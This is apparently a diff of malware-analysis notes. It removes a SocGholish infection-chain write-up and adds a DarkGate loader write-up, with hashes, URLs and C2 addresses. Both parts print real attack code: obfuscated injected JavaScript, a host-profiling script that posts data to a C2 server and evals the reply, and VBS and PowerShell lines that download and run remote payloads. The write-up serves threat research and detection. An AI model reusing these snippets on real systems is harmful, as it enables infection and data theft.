@@ -1,165 +1,92 @@
- 
-THREAT IDENTIFICATION: SOCGHOLISH
- 
-INFECTED DOMAIN
-carolinapharmacy.com
+THREAT IDENTIFICATION: DARKGATE LOADER
 
-STAGE 1 INJECTED URL
-https://carolinapharmacy.com/
+INFECTION FLOW
+xlsx -> link to vbs file -> powershell scripts -> ahk -> dll -> C2
 
-STAGE 1 INJECTED SCRIPT
-<script async src="https://aitcaid.com/9659650c81ce1b984c58.js"></script>
+XLSX FILE HASHES
+march-D2317-2024.xlsx
+3dff510e3ae37d39e04c15f0f411cf43
+(All files I saw were named: "march-D[0-9]{4}-2024.xlsx")
 
-STAGE 1 REDIRECT SCRIPT URL
-https://aitcaid.com/9659650c81ce1b984c58.js
+XLSX FILE BUTTON HYPERLINK
+\\64.226.97.86\share\EXCEL_OPEN_DOC.vbs
 
-STAGE 1 REDIRECT SCRIPT CONTENTS
-(function (v, d, r, y, a, b) {
-a = d.createElement(r)
-b = d.getElementsByTagName(r)[0]
-a.async = 1
-a.src = y
-b.parentNode.insertBefore(a, b)
-})(
-window,
-document,
-'script',
-'https://pluralism.themancav.com/lbK9kO6Q3vnxkIeio4aRsueQh7L82d/o+dXbsug='
-)
+RETRIEVED WITH:
+file:///\\64.226.97.86\share\EXCEL_OPEN_DOC.vbs"
 
-STAGE 2 INJECTED URL
-https://pluralism.themancav.com/lbK9kO6Q3vnxkIeio4aRsueQh7L82d/o+dXbsug=
+VBS SCRIPT FILE HASH
+EXCEL_OPEN_DOC.vbs
+e9da2f1fbf627a05811cf294a1136a64
 
-STAGE 2 INJECTED JAVASCRIPT
-(function () {
-  var _0x41564e = window,
-    _0x1e36d5 = _0x41564e.document.cookie
-  var _0x1058a6 = 'adViewEnabled'
-  if (_0x41564e.localStorage[_0x41564e.location.hostname]) {
-    return
-  }
-  if (_0x41564e.navigator.webdriver) {
-    _0x63fd0a(
-      'https://pluralism.themancav.com/NxQyJ0w2UU5TNggVASAeBURgV1cVLhBXRXFRT1J3WXhdZ21BRXtcU1JmQEhFNh4FUmZASEU2CBYbNkAFDTZKQU1tX1FGcUFWFWk='
-    )
-    return
-  }
-  if (
-    _0x41564e.outerHeight - _0x41564e.innerHeight > 200 ||
-    _0x41564e.outerWidth - _0x41564e.innerWidth > 330
-  ) {
-    _0x63fd0a(
-      'https://pluralism.themancav.com/lKI4Tu+AWyfwgAJ8opYUbOfWXT62mBo+5sdbJvHBUxH+0Wco5s1WOvHQSiHmgBRs8dBKIeaAAny4gEpsroBSL/jbGjM='
-    )
-    return
-  }
-  if (
-    _0x1e36d5.indexOf('wordpress_logged_in_') !== -1 ||
-    _0x1e36d5.indexOf('wp-settings-') !== -1
-  ) {
-    return
-  }
-  if (typeof _0x41564e[_0x1058a6] !== 'undefined') {
-    return
-  }
-  _0x41564e[_0x1058a6] = true
-  _0x41564e.addEventListener('mousemove', _0x2b138c, true)
-  function _0x2b138c() {
-    _0x41564e.removeEventListener('mousemove', _0x2b138c, true)
-    _0x63fd0a(
-      'https://pluralism.themancav.com/t7y+Isye3UvTnoQQgYiSAMTI21KVhpxD2d3SW83Z4UTHnpIAxZ6EAMbUy0jP3t1BxN/JTsLEzlTe3pxf'
-    )
-  }
-  function _0x63fd0a(_0x30b179) {
-    var _0x2cda95 = document.createElement('script')
-    _0x2cda95.async = true
-    _0x2cda95.src = _0x30b179
-    var _0x5acfc8 = document.getElementsByTagName('script')[0]
-    _0x5acfc8.parentNode.insertBefore(_0x2cda95, _0x5acfc8)
-  }
-})
+RELEVANT PART OF THE VBS SCRIPT
+ppbfjlcz = "-Command Invoke-Expression (Invoke-RestMethod -Uri 'nextroundst.com/kqcmvqtj')"
+  on error resume next
 
-ZIP FILE DOWNLOAD URL
-https://pluralism.themancav.com/mR+Vx+I99q79Pa/1ryu55epr8Le7Jber+HHxrvd4yqHwc/DltT3n5aM996/+aOat9m63ug==
+    set oError = CreateObject("WbemScripting.SWbemLastError")
 
-ZIP FILE HASH
-UpdateInstaller.zip
-dc5b54ab708d0e9a381590ffbfc92145
+    if Err = kErrorSuccess then
 
-JS FILE HASH
-Version.124.8249.44.js
-5f4278bb02fc47323762fbf256ed88f6
+        wscript.echo L_Operation_Text            & L_Space_Text & oError.Operation
+        wscript.echo L_Provider_Text             & L_Space_Text & oError.ProviderName
+        wscript.echo L_Description_Text          & L_Space_Text & oError.Description
+        wscript.echo L_Text_Error_General04_Text & L_Space_Text & oError.StatusCode
 
-STAGE 3 PROXY FOR SOCGHOLISH C2
-https://nknsz.round.fishingreelinvestment.com/editContent
+    end if
+CreateObject(jhempplk).ShellExecute vcnaecac, ppbfjlcz ,"","",0
 
-FILTERING SCRIPT
-var jt = ''
-var ot = new ActiveXObject('WScript.Shell')
-var up = new ActiveXObject('WScript.Network')
-var kq = []
-kq.push('b')
-kq.push('505')
-kq.push(WScript.ScriptFullName)
-kq.push(up.ComputerName)
-kq.push(up.UserName)
-kq.push(up.UserDomain)
-kq.push(ot.ExpandEnvironmentStrings('%userdnsdomain%'))
-kq.push(wo('CIMV2', 'Win32_ComputerSystem', 'Manufacturer'))
-kq.push(wo('CIMV2', 'Win32_ComputerSystem', 'Model'))
-kq.push(
-  wo('CIMV2', 'Win32_BIOS', 'Version') +
-    wo('CIMV2', 'Win32_BIOS', 'SerialNumber')
-)
-kq.push(wo('SecurityCenter2', 'AntiSpywareProduct', 'displayName'))
-kq.push(wo('SecurityCenter2', 'AntiVirusProduct', 'displayName'))
-kq.push(wo('CIMV2', 'CIM_NetworkAdapter', 'MACAddress'))
-kq.push(wo('CIMV2', 'Win32_Process', 'Name'))
-kq.push(wo('CIMV2', 'Win32_OperatingSystem', 'BuildNumber'))
-function wo(qe, yt, ed) {
-  var nb = ''
-  try {
-    var vc = GetObject('winmgmts:\\\\.\\root\\' + qe)
-    var ym = vc.ExecQuery('SELECT * FROM ' + yt, 'WQL')
-    var ka = new Enumerator(ym)
-    for (; !ka.atEnd(); ka.moveNext()) {
-      var gq = ka.item()
-      if (gq[ed]) {
-        nb += gq[ed] + '|'
-      }
-    }
-  } catch (e) {
-    nb = '-1'
-  }
-  return nb
-}
-try {
-  var jy = ''
-  for (var xx = 0; xx < kq.length; xx++) {
-    jy += xx + '=' + encodeURIComponent(kq[xx]) + '&'
-  }
-  var nb = ''
-  var hr = new ActiveXObject('MSXML2.XMLHTTP')
-  hr.open(
-    'POST',
-    'https://nknsz.round.fishingreelinvestment.com/editContent',
-    false
-  )
-  hr.setRequestHeader('Upgrade-Insecure-Requests', '1')
-  hr.send(jy)
-  nb = hr.responseText
-  var evString = 'eval'
-  this[evString](nb)
-} catch (e) {}
+INTERCEPTED POWERSHELL SCRIPT
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command Invoke-Expression (Invoke-RestMethod -Uri 'nextroundst.com/kqcmvqtj')
 
-PAYLOAD DOWNLOAD URL
-I did not receive a payload.
+URLS FROM PCAP TRAFFIC 
+http://nextroundst.com/kqcmvqtj
+http://nextroundst.com/aa
+http://nextroundst.com/ffcxlohx
+http://nextroundst.com/nlcsphze
 
-PAYLOAD FILE HASH
-I did not receive a payload.
+DOWNLOADED SCRIPT FILE HASH
+kqcmvqtj
+f3fcf6e83baf14571d2075dee7493593
 
-PAYLOAD C2
-I did not receive a payload.
+DOWNLOADED SCRIPT CONTENTS (kqcmvqtj)
+ni 'C:/st' - Type Directory - Force;
+cd 'C:/st';
+Invoke - WebRequest - Uri "http://nextroundst.com/aa" - OutFile 'a.bin';
+certutil - decodehex a.bin AutoHotkey.exe;
+Invoke - WebRequest - Uri "http://nextroundst.com/ffcxlohx" - OutFile 'script.ahk';
+Invoke - WebRequest - Uri "http://nextroundst.com/nlcsphze" - OutFile 'test.txt';
+start 'AutoHotkey.exe' - a 'script.ahk';
+attrib + h 'C:/st'
 
+DOWNLOADED BINARY FILE HASH
+a.bin
+bf88d228baec74c7928df463db0f0fdc
+(Same as the downloaded file named: aa )
+
+LEGITIMATE AUTOHOTKEY BINARY FILE HASH
+AutoHotkey.exe
+a59a2d3e5dda7aca6ec879263aa42fd3
+
+AUTOHOTKEY SCRIPT FILE HASH
+script.ahk
+2e319e5e6ab619a01eb3b95cd11c8143
+(Same as the downloaded file named: ffcxlohx )
+
+HEX ENCODED DARKGATE FILE HASH
+test.txt
+f5a710f2471af13c14c80b190081b93e
+(This file contains a large hex-encoded data blob)
+
+UNPACKED PAYLOAD FILE HASH
+47f0b3d.exe
+4278eb3c85338caceb19183b89368796
+
+DARKGATE C2s
+POST http://nextroundst.com/
+204.93.201.142
+
+
+OBSERVED STRINGS IN MEMORY
+C:\ProgramData\bcdkfhd\bbdaaah.ahk
+C:\ProgramData\bcdkfhd\gagahfe\14-03-2024.log
 
 
